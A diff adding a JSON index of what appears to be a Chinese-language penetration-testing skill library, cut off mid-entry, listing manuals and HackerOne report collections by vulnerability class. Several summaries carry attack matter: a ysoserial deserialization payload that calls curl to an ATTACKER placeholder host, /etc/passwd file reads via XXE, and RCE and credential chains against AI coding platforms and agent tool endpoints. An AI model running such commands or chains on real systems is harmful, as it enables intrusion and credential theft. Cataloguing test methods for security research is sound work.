@@ -1,0 +1,1903 @@
+{
+ "meta": {
+  "source": "clown-src-6k-skill",
+  "count": 187,
+  "categories": {
+   "越权": 11,
+   "注入": 21,
+   "文件与上传": 11,
+   "认证与会话": 3,
+   "协议与架构": 13,
+   "业务逻辑": 4,
+   "信息与资产": 19,
+   "反序列化": 2,
+   "AI 与云": 3,
+   "其他": 35,
+   "禁用": 2,
+   "资源消耗": 3,
+   "XSS": 6,
+   "认证": 22,
+   "内存安全": 14,
+   "配置": 6,
+   "XXE": 1,
+   "加密": 7,
+   "前端": 1,
+   "国产系统": 3
+  },
+  "h1_reports": {
+   "files": 136,
+   "total_reports": 2385,
+   "kept_reports": 1341
+  }
+ },
+ "entries": [
+  {
+   "slug": "idor-test",
+   "title": "越权漏洞（IDOR/权限绕过）测试手册",
+   "file": "idor-test.md",
+   "category": "越权",
+   "lines": 581,
+   "summary": "读差分够闭环就不要写。读不够、要证「能改别人的东西」时：",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "authbypass-test",
+   "title": "authbypass-authentication-flaws",
+   "file": "authbypass-test.md",
+   "category": "越权",
+   "lines": 321,
+   "summary": "打开是登录页 / SSO → 表单壳听 dig-scope §4.1.1：找业务面；别按本文件从头跑字典 / 验证码 / 无限试密。",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "type-juggling-test",
+   "title": "type-juggling",
+   "file": "type-juggling-test.md",
+   "category": "越权",
+   "lines": 285,
+   "summary": "First-pass goal: prove the server branch treats unequal secrets/tokens as equal via coercion, not guess the real password.",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "prototype-pollution-test",
+   "title": "prototype-pollution",
+   "file": "prototype-pollution-test.md",
+   "category": "注入",
+   "lines": 773,
+   "summary": "When input can reflect into DOM or framework routing, pair with alert(1) / console checks to observe whether global object propert",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "xxe-test",
+   "title": "xxe",
+   "file": "xxe-test.md",
+   "category": "注入",
+   "lines": 648,
+   "summary": "If /etc/passwd reflects in response → confirmed file read.",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "jndi-injection-test",
+   "title": "jndi-injection",
+   "file": "jndi-injection-test.md",
+   "category": "注入",
+   "lines": 271,
+   "summary": "JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "xss-test",
+   "title": "XSS 测试手册",
+   "file": "xss-test.md",
+   "category": "注入",
+   "lines": 245,
+   "summary": "打穿了按 vuln-report-format 定级，不按存储/反射/DOM 抬级。",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "el-injection-test",
+   "title": "expression-language-injection",
+   "file": "el-injection-test.md",
+   "category": "注入",
+   "lines": 229,
+   "summary": "expression-language-injection",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "ssrf-test",
+   "title": "SSRF 测试手册",
+   "file": "ssrf-test.md",
+   "category": "注入",
+   "lines": 146,
+   "summary": "图片/文件URL参数: imageUrl=, fileUrl=, url=, link=, targetUrl=",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "injection-test",
+   "title": "注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）",
+   "file": "injection-test.md",
+   "category": "注入",
+   "lines": 79,
+   "summary": "企业流水、消费、员工名单这类列表，筛的是 employeeName / 姓名 / 关键字，回包带 total / totalNum / totalSize，后端经常是 ES 或「能跑一段 SQL 的搜索」。",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "crlf-injection-test",
+   "title": "crlf-injection-test（几乎不交）",
+   "file": "crlf-injection-test.md",
+   "category": "注入",
+   "lines": 3,
+   "summary": "crlf-injection-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "email-header-injection-test",
+   "title": "email-header-injection-test（几乎不交）",
+   "file": "email-header-injection-test.md",
+   "category": "注入",
+   "lines": 3,
+   "summary": "email-header-injection-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "hpp-test",
+   "title": "hpp-test（几乎不交）",
+   "file": "hpp-test.md",
+   "category": "注入",
+   "lines": 3,
+   "summary": "hpp-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "xslt-injection-test",
+   "title": "xslt-injection-test（几乎不交）",
+   "file": "xslt-injection-test.md",
+   "category": "注入",
+   "lines": 3,
+   "summary": "xslt-injection-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "path-traversal-lfi-test",
+   "title": "path-traversal-lfi",
+   "file": "path-traversal-lfi-test.md",
+   "category": "文件与上传",
+   "lines": 824,
+   "summary": "Path Traversal: Read arbitrary files by escaping the intended directory with ../ sequences.",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "file-upload-test",
+   "title": "文件上传漏洞测试手册",
+   "file": "file-upload-test.md",
+   "category": "文件与上传",
+   "lines": 167,
+   "summary": "找上传点（头像/附件/导入/富文本）→ 先传正常文件看路径、是否重命名、落 CDN/OSS 还是本机、能不能直接打开。别停在能传能下：跟覆盖他人对象、带签读、可执行/路径/SSRF。后缀/Content-Type/解析绕过现场按栈自己变。",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "insecure-scm-test",
+   "title": "insecure-scm",
+   "file": "insecure-scm-test.md",
+   "category": "文件与上传",
+   "lines": 159,
+   "summary": "High-value paths to probe first (GET or HEAD, respect rate limits):",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "oauth-jwt-test",
+   "title": "OAuth/JWT/SAML 安全测试手册",
+   "file": "oauth-jwt-test.md",
+   "category": "认证与会话",
+   "lines": 834,
+   "summary": "OAuth/JWT/SAML 安全测试手册",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "csrf-test",
+   "title": "csrf",
+   "file": "csrf-test.md",
+   "category": "认证与会话",
+   "lines": 593,
+   "summary": "CSRF exploits a victim's active session to perform state-changing requests from the attacker's origin.",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "clickjacking-test",
+   "title": "clickjacking-test（缺头不写）",
+   "file": "clickjacking-test.md",
+   "category": "认证与会话",
+   "lines": 3,
+   "summary": "clickjacking-test（缺头不写）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "http-smuggling-test",
+   "title": "HTTP 请求走私测试手册",
+   "file": "http-smuggling-test.md",
+   "category": "协议与架构",
+   "lines": 1343,
+   "summary": "前端服务器（CDN/负载均衡器）与后端服务器对 HTTP 请求边界的解析不一致。",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "cache-poisoning-test",
+   "title": "缓存投毒测试手册",
+   "file": "cache-poisoning-test.md",
+   "category": "协议与架构",
+   "lines": 1298,
+   "summary": "缓存键 (Cache Key): 决定缓存条目的唯一标识",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "websocket-test",
+   "title": "WebSocket 安全测试手册",
+   "file": "websocket-test.md",
+   "category": "协议与架构",
+   "lines": 1056,
+   "summary": "WebSocket 安全测试手册",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "graphql-test",
+   "title": "GraphQL 安全测试手册",
+   "file": "graphql-test.md",
+   "category": "协议与架构",
+   "lines": 519,
+   "summary": "GraphQL 安全测试手册",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "api-gateway-test",
+   "title": "API 网关安全测试手册",
+   "file": "api-gateway-test.md",
+   "category": "协议与架构",
+   "lines": 503,
+   "summary": "API 网关和后端服务对路径的规范化处理不一致",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "http-host-header-test",
+   "title": "http-host-header",
+   "file": "http-host-header-test.md",
+   "category": "协议与架构",
+   "lines": 323,
+   "summary": "The Host header is used by web applications and infrastructure for:",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "http2-attacks-test",
+   "title": "http2-attacks-test（几乎不交）",
+   "file": "http2-attacks-test.md",
+   "category": "协议与架构",
+   "lines": 3,
+   "summary": "http2-attacks-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "race-condition-test",
+   "title": "竞态条件测试手册",
+   "file": "race-condition-test.md",
+   "category": "业务逻辑",
+   "lines": 1069,
+   "summary": "1. 检查条件（如余额是否充足）",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "logic-test",
+   "title": "逻辑漏洞测试手册",
+   "file": "logic-test.md",
+   "category": "业务逻辑",
+   "lines": 213,
+   "summary": "逻辑漏洞测试手册",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "recon-methodology",
+   "title": "recon-and-methodology",
+   "file": "recon-methodology.md",
+   "category": "信息与资产",
+   "lines": 411,
+   "summary": "size：先小后翻；本种子结果可翻页，不是换种子",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "info-leak-test",
+   "title": "信息泄露测试手册",
+   "file": "info-leak-test.md",
+   "category": "信息与资产",
+   "lines": 256,
+   "summary": "-H \"Authorization: Bearer $TOKEN\" | python3 -m json.tool",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "subdomain-takeover-test",
+   "title": "subdomain-takeover",
+   "file": "subdomain-takeover-test.md",
+   "category": "信息与资产",
+   "lines": 230,
+   "summary": "1. sub.target.com has a DNS record (CNAME, NS, A) pointing to an external service",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "dependency-confusion-test",
+   "title": "dependency-confusion-test（几乎不交）",
+   "file": "dependency-confusion-test.md",
+   "category": "信息与资产",
+   "lines": 3,
+   "summary": "dependency-confusion-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "dns-rebinding-test",
+   "title": "dns-rebinding-test（几乎不交）",
+   "file": "dns-rebinding-test.md",
+   "category": "信息与资产",
+   "lines": 3,
+   "summary": "dns-rebinding-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "deserialization-test",
+   "title": "deserialization",
+   "file": "deserialization-test.md",
+   "category": "反序列化",
+   "lines": 1217,
+   "summary": "java -jar ysoserial.jar CommonsCollections1 \"curl http://ATTACKER/pwned\" > payload.bin",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "ghost-bits-cast-test",
+   "title": "ghost-bits-cast-attack",
+   "file": "ghost-bits-cast-test.md",
+   "category": "AI 与云",
+   "lines": 743,
+   "summary": "Java's char is a 16-bit unsigned integer (UTF-16 code unit). Almost",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "cloud-ide-codex-rce-chain",
+   "title": "云 IDE / Codex 系 AI 编程平台：弱口令→Root RCE→凭证链",
+   "file": "cloud-ide-codex-rce-chain.md",
+   "category": "AI 与云",
+   "lines": 203,
+   "summary": "认：公网编程台有 /tenant-api/login + /codex-api/rpc（或同类租户登录 + Codex RPC）。不是对话口 bash 工具（那枪见 agent-tool-exec-test.md），也不是 VS Code 无登录墙读 envi",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "agent-tool-exec-test",
+   "title": "对话口工具真执行",
+   "file": "agent-tool-exec-test.md",
+   "category": "AI 与云",
+   "lines": 52,
+   "summary": "1. 问身份 / whoami / profile 一类口回未登录、401、unauthenticated，同一套前端的对话口（/chat / createTask 一类）不带 Cookie 仍接",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "waf-bypass",
+   "title": "waf-bypass",
+   "file": "waf-bypass.md",
+   "category": "其他",
+   "lines": 6501,
+   "summary": "176 个原始 payload × 23 类（SQLi/SSTI/JWT/云/走私等），每类含 WAF 绕过变体",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "open-redirect-test",
+   "title": "open-redirect",
+   "file": "open-redirect-test.md",
+   "category": "其他",
+   "lines": 379,
+   "summary": "Open redirect occurs when an application redirects users to a URL derived from user input without validation. The trusted domain a",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "js-reverse-guide",
+   "title": "JS 逆向配合接口挖掘指南",
+   "file": "js-reverse-guide.md",
+   "category": "其他",
+   "lines": 202,
+   "summary": "页面接口有加密参数，无法直接用 curl 重放",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "打穿短表",
+   "title": "打穿短表（索引）",
+   "file": "打穿短表.md",
+   "category": "其他",
+   "lines": 95,
+   "summary": "打穿短表（索引）",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "401-403-bypass",
+   "title": "401-403-bypass（禁开磨登录 HTML）",
+   "file": "401-403-bypass.md",
+   "category": "其他",
+   "lines": 3,
+   "summary": "401-403-bypass（禁开磨登录 HTML）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "csp-bypass-test",
+   "title": "csp-bypass-test（几乎不交）",
+   "file": "csp-bypass-test.md",
+   "category": "其他",
+   "lines": 3,
+   "summary": "csp-bypass-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "csv-formula-injection-test",
+   "title": "csv-formula-injection-test（几乎不交）",
+   "file": "csv-formula-injection-test.md",
+   "category": "其他",
+   "lines": 3,
+   "summary": "csv-formula-injection-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "dangling-markup-test",
+   "title": "dangling-markup-test（几乎不交）",
+   "file": "dangling-markup-test.md",
+   "category": "其他",
+   "lines": 3,
+   "summary": "dangling-markup-test（几乎不交）",
+   "stub": true,
+   "banned": false
+  },
+  {
+   "slug": "cors-test",
+   "title": "cors-test",
+   "file": "cors-test.md",
+   "category": "禁用",
+   "lines": 3,
+   "summary": "【禁开】按 6k 原始规则本模块禁开（CORS 不挖 / 越狱教材禁开）",
+   "banned": true
+  },
+  {
+   "slug": "llm-security-test",
+   "title": "llm-security-test",
+   "file": "llm-security-test.md",
+   "category": "禁用",
+   "lines": 3,
+   "summary": "【禁开】按 6k 原始规则本模块禁开（CORS 不挖 / 越狱教材禁开）",
+   "banned": true
+  },
+  {
+   "slug": "h1-uncategorized",
+   "title": "HackerOne uncategorized",
+   "file": "h1-uncategorized.md",
+   "category": "其他",
+   "lines": 595,
+   "summary": "167 份真实报告，如：Remote Code Execution identified on IBM ；SMTP CRLF Injection in curl/libcurl via ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-access-control-generic",
+   "title": "HackerOne improper-access-control-generic",
+   "file": "h1-improper-access-control-generic.md",
+   "category": "越权",
+   "lines": 609,
+   "summary": "185 份真实报告，如：Air Force candidate PII + recruitment ch；Unauthorized coins transfer from locking",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-information-disclosure",
+   "title": "HackerOne information-disclosure",
+   "file": "h1-information-disclosure.md",
+   "category": "信息与资产",
+   "lines": 588,
+   "summary": "187 份真实报告，如：ASBS viewing other soldiers PII/Board/Bo；Netlify Authentication Token Exposed in ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-uncontrolled-resource-consumption",
+   "title": "HackerOne uncontrolled-resource-consumption",
+   "file": "h1-uncontrolled-resource-consumption.md",
+   "category": "资源消耗",
+   "lines": 568,
+   "summary": "107 份真实报告，如：Critical Deadlock Vulnerability in Moner；WordPress application vulnerable to DoS ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-sql-injection",
+   "title": "HackerOne sql-injection",
+   "file": "h1-sql-injection.md",
+   "category": "注入",
+   "lines": 555,
+   "summary": "109 份真实报告，如：Complete authentication bypass to admin ；SQL Injection vulnerability found on ibm",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-code-injection",
+   "title": "HackerOne code-injection",
+   "file": "h1-code-injection.md",
+   "category": "注入",
+   "lines": 563,
+   "summary": "111 份真实报告，如：Internal application wrapper or script u；Title: Remote Code Execution (RCE) via A",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cross-site-scripting-xss-stored",
+   "title": "HackerOne cross-site-scripting-xss-stored",
+   "file": "h1-cross-site-scripting-xss-stored.md",
+   "category": "XSS",
+   "lines": 542,
+   "summary": "149 份真实报告，如：XSS via /api/v1/chat.postMessage；Stored XSS on LinkedIn App via iframe ta",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-server-side-request-forgery-ssrf",
+   "title": "HackerOne server-side-request-forgery-ssrf",
+   "file": "h1-server-side-request-forgery-ssrf.md",
+   "category": "协议与架构",
+   "lines": 559,
+   "summary": "74 份真实报告，如：DNS Rebinding Attack；Server-Side Request Forgery (SSRF) via G",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-privilege-escalation",
+   "title": "HackerOne privilege-escalation",
+   "file": "h1-privilege-escalation.md",
+   "category": "越权",
+   "lines": 526,
+   "summary": "106 份真实报告，如：Unauthorized access to PII leads to Admi；Ad Account Takeover",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-authentication-generic",
+   "title": "HackerOne improper-authentication-generic",
+   "file": "h1-improper-authentication-generic.md",
+   "category": "认证",
+   "lines": 539,
+   "summary": "112 份真实报告，如：Yet Another OTP code Leaked in the API R；Authentication Bypass in login-token Aut",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-command-injection-generic",
+   "title": "HackerOne command-injection-generic",
+   "file": "h1-command-injection-generic.md",
+   "category": "注入",
+   "lines": 548,
+   "summary": "76 份真实报告，如：Argument Injection via curl Short-Flag G；Middleware Authentication Bypass on IBM ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-memory-corruption-generic",
+   "title": "HackerOne memory-corruption-generic",
+   "file": "h1-memory-corruption-generic.md",
+   "category": "内存安全",
+   "lines": 363,
+   "summary": "26 份真实报告，如：Buffer Overflow in curl MQTT Test Server；LZMADecompressor.decompress Use After Fr",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-heap-overflow",
+   "title": "HackerOne heap-overflow",
+   "file": "h1-heap-overflow.md",
+   "category": "内存安全",
+   "lines": 337,
+   "summary": "22 份真实报告，如：Heap Buffer Overflow in TFTP；CVE-2020-10938-buffer overflow/out-of-bo",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-business-logic-errors",
+   "title": "HackerOne business-logic-errors",
+   "file": "h1-business-logic-errors.md",
+   "category": "业务逻辑",
+   "lines": 577,
+   "summary": "55 份真实报告，如：Change phone number OTP flaw leads to an；Unauthorized access to PII leads to MASS",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-insecure-direct-object-reference-idor",
+   "title": "HackerOne insecure-direct-object-reference-idor",
+   "file": "h1-insecure-direct-object-reference-idor.md",
+   "category": "越权",
+   "lines": 522,
+   "summary": "93 份真实报告，如：Authentication Bypass in Subscription Ma；Sale cancellations from other sellers wi",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cross-site-scripting-xss-generic",
+   "title": "HackerOne cross-site-scripting-xss-generic",
+   "file": "h1-cross-site-scripting-xss-generic.md",
+   "category": "XSS",
+   "lines": 542,
+   "summary": "53 份真实报告，如：New XSS vector in ReaderMode with %READE；Subdomain takeover due to an unclaimed A",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-os-command-injection",
+   "title": "HackerOne os-command-injection",
+   "file": "h1-os-command-injection.md",
+   "category": "注入",
+   "lines": 507,
+   "summary": "34 份真实报告，如：GlobalProtect - OS Command Injection #██；Unauthenticated Path Traversal and Comma",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-violation-of-secure-design-principles",
+   "title": "HackerOne violation-of-secure-design-principles",
+   "file": "h1-violation-of-secure-design-principles.md",
+   "category": "配置",
+   "lines": 428,
+   "summary": "28 份真实报告，如：Cross‑Layer State Confusion in libcurl: ；Exposure of Private Personal Information",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cross-site-request-forgery-csrf",
+   "title": "HackerOne cross-site-request-forgery-csrf",
+   "file": "h1-cross-site-request-forgery-csrf.md",
+   "category": "XSS",
+   "lines": 542,
+   "summary": "52 份真实报告，如：Revocation API Token by Bypassing The XS；CSRF to change password",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-classic-buffer-overflow",
+   "title": "HackerOne classic-buffer-overflow",
+   "file": "h1-classic-buffer-overflow.md",
+   "category": "内存安全",
+   "lines": 345,
+   "summary": "27 份真实报告，如：Buffer Overflow Vulnerability in strcpy(；Buffer overflow and affected url:-https:",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-deserialization-of-untrusted-data",
+   "title": "HackerOne deserialization-of-untrusted-data",
+   "file": "h1-deserialization-of-untrusted-data.md",
+   "category": "反序列化",
+   "lines": 383,
+   "summary": "30 份真实报告，如：insecure deserilize object leads to RCE ；RCE on Wordpress website",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-buffer-over-read",
+   "title": "HackerOne buffer-over-read",
+   "file": "h1-buffer-over-read.md",
+   "category": "内存安全",
+   "lines": 372,
+   "summary": "25 份真实报告，如：h1 hacky holidays CTF solution；Out of Bounds Memory Read in php_jpg_get",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-use-after-free",
+   "title": "HackerOne use-after-free",
+   "file": "h1-use-after-free.md",
+   "category": "内存安全",
+   "lines": 232,
+   "summary": "17 份真实报告，如：UAF on JSEthereumProvider；Use after free and out of bounds read in",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-xml-external-entities-xxe",
+   "title": "HackerOne xml-external-entities-xxe",
+   "file": "h1-xml-external-entities-xxe.md",
+   "category": "XXE",
+   "lines": 306,
+   "summary": "21 份真实报告，如：AEM forms XXE Vulnerability；HackerOne’s 100K CTF Writeup",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-http-request-smuggling",
+   "title": "HackerOne http-request-smuggling",
+   "file": "h1-http-request-smuggling.md",
+   "category": "协议与架构",
+   "lines": 364,
+   "summary": "27 份真实报告，如：HTTP request smuggling with Origin Rules；HTTP Request Smuggling in Transform Rule",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cross-site-scripting-xss-reflected",
+   "title": "HackerOne cross-site-scripting-xss-reflected",
+   "file": "h1-cross-site-scripting-xss-reflected.md",
+   "category": "XSS",
+   "lines": 539,
+   "summary": "48 份真实报告，如：Reflected XSS in https://nin.mtn.ng/nin/；Reflected XSS",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-out-of-bounds-read",
+   "title": "HackerOne out-of-bounds-read",
+   "file": "h1-out-of-bounds-read.md",
+   "category": "内存安全",
+   "lines": 248,
+   "summary": "15 份真实报告，如：Adam and the  Deadly  Injections；RCE on CS:GO client using unsanitized en",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-insecure-storage-of-sensitive-information",
+   "title": "HackerOne insecure-storage-of-sensitive-information",
+   "file": "h1-insecure-storage-of-sensitive-information.md",
+   "category": "信息与资产",
+   "lines": 337,
+   "summary": "19 份真实报告，如：Exposed Extremely Sensitive Information ；Local File Disclosure on the █████ (http",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-input-validation",
+   "title": "HackerOne improper-input-validation",
+   "file": "h1-improper-input-validation.md",
+   "category": "其他",
+   "lines": 241,
+   "summary": "18 份真实报告，如：Remote code execution due to unvalidated；Economic Harm through Twitter's Cropping",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cross-site-scripting-xss-dom",
+   "title": "HackerOne cross-site-scripting-xss-dom",
+   "file": "h1-cross-site-scripting-xss-dom.md",
+   "category": "XSS",
+   "lines": 365,
+   "summary": "26 份真实报告，如：XSS on using the legacy \"Graphie To Png\"；xss due to incorrect handling of postmes",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-certificate-validation",
+   "title": "HackerOne improper-certificate-validation",
+   "file": "h1-improper-certificate-validation.md",
+   "category": "认证",
+   "lines": 155,
+   "summary": "12 份真实报告，如：Silent TLS Trust Model Hijacking via `CU；Remotely trigger an assertion on a TLS s",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-stack-overflow",
+   "title": "HackerOne stack-overflow",
+   "file": "h1-stack-overflow.md",
+   "category": "内存安全",
+   "lines": 181,
+   "summary": "12 份真实报告，如：Buffer Overflow in cURL Internal printf ；GoldSrc: Buffer Overflow in DELTA_ParseD",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cryptographic-issues-generic",
+   "title": "HackerOne cryptographic-issues-generic",
+   "file": "h1-cryptographic-issues-generic.md",
+   "category": "加密",
+   "lines": 214,
+   "summary": "16 份真实报告，如：RCE (Remote code execution) in one of Do；█████████ - Insecure download cookie gen",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-restriction-of-authentication-attempts",
+   "title": "HackerOne improper-restriction-of-authentication-attempts",
+   "file": "h1-improper-restriction-of-authentication-attempts.md",
+   "category": "认证",
+   "lines": 265,
+   "summary": "16 份真实报告，如：Improper Restriction of Authentication A；weak protection against brute-forcing on",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-cleartext-storage-of-sensitive-information",
+   "title": "HackerOne cleartext-storage-of-sensitive-information",
+   "file": "h1-cleartext-storage-of-sensitive-information.md",
+   "category": "信息与资产",
+   "lines": 282,
+   "summary": "19 份真实报告，如：Unauthorized Account Access via Leaked C；███ leaking PII of tour visitors (names,",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-privacy-violation",
+   "title": "HackerOne privacy-violation",
+   "file": "h1-privacy-violation.md",
+   "category": "信息与资产",
+   "lines": 198,
+   "summary": "14 份真实报告，如：Connection informaton is sent to a third；Physical Laptop Takeover",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-remote-file-inclusion",
+   "title": "HackerOne remote-file-inclusion",
+   "file": "h1-remote-file-inclusion.md",
+   "category": "文件与上传",
+   "lines": 55,
+   "summary": "3 份真实报告，如：HTML injection in API response including；2x Remote file inclusion within your VMw",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-insufficiently-protected-credentials",
+   "title": "HackerOne insufficiently-protected-credentials",
+   "file": "h1-insufficiently-protected-credentials.md",
+   "category": "认证",
+   "lines": 130,
+   "summary": "9 份真实报告，如：Authentication Token Theft via Open Redi；Hashed data exposure via WebSockets to W",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-authorization",
+   "title": "HackerOne improper-authorization",
+   "file": "h1-improper-authorization.md",
+   "category": "越权",
+   "lines": 142,
+   "summary": "11 份真实报告，如：Email verification bypass via request  t；Hijack all emails sent to any domain tha",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-misconfiguration",
+   "title": "HackerOne misconfiguration",
+   "file": "h1-misconfiguration.md",
+   "category": "配置",
+   "lines": 231,
+   "summary": "17 份真实报告，如：Мисконфигурация Cisco Smart Install；Weak password policy leading to exposure",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-integer-overflow",
+   "title": "HackerOne integer-overflow",
+   "file": "h1-integer-overflow.md",
+   "category": "内存安全",
+   "lines": 91,
+   "summary": "7 份真实报告，如：Cookie Max-Age Integer Overflow Vulnerab；Integer overflow vulnerability",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-ui-redressing-clickjacking",
+   "title": "HackerOne ui-redressing-clickjacking",
+   "file": "h1-ui-redressing-clickjacking.md",
+   "category": "前端",
+   "lines": 114,
+   "summary": "8 份真实报告，如：Clickjacking In https://demo.nextcloud.c；Clickjacking at  app.lemlist.com",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-open-redirect",
+   "title": "HackerOne open-redirect",
+   "file": "h1-open-redirect.md",
+   "category": "协议与架构",
+   "lines": 142,
+   "summary": "10 份真实报告，如：url redirection；CVE‑2025‑4123 — Grafana Open Redirect → ",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-information-exposure-through-directory-listing",
+   "title": "HackerOne information-exposure-through-directory-listing",
+   "file": "h1-information-exposure-through-directory-listing.md",
+   "category": "信息与资产",
+   "lines": 92,
+   "summary": "6 份真实报告，如：Directory listing vulnerability is discl；Information Disclosure Due To exposed .e",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-security-through-obscurity",
+   "title": "HackerOne security-through-obscurity",
+   "file": "h1-security-through-obscurity.md",
+   "category": "信息与资产",
+   "lines": 18,
+   "summary": "1 份真实报告，如：Subdomain takeover of █████████",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-improper-null-termination",
+   "title": "HackerOne improper-null-termination",
+   "file": "h1-improper-null-termination.md",
+   "category": "内存安全",
+   "lines": 77,
+   "summary": "5 份真实报告，如：HackerOne SAML signup domain enforcement；Improper handling of untypical character",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-resource-injection",
+   "title": "HackerOne resource-injection",
+   "file": "h1-resource-injection.md",
+   "category": "注入",
+   "lines": 33,
+   "summary": "3 份真实报告，如：Zero-amount miner TX + RingCT allows mon；Content injection in Jira issue title en",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-authentication-bypass-using-an-alternate-path-or-channel",
+   "title": "HackerOne authentication-bypass-using-an-alternate-path-or-channel",
+   "file": "h1-authentication-bypass-using-an-alternate-path-or-channel.md",
+   "category": "认证",
+   "lines": 156,
+   "summary": "12 份真实报告，如：Ability to Add and Verify Uncontrolled M；Authentication Bypass Leads To  Complete",
+   "stub": false,
+   "banned": false
+  },
+  {
+   "slug": "h1-key-exchange-without-entity-authentication",
+   "title": "HackerOne key-exchange-without-entity-authentication",
+   "file": "h1-key-exchange-without-entity-authentication.md",
+   "category": "认证",
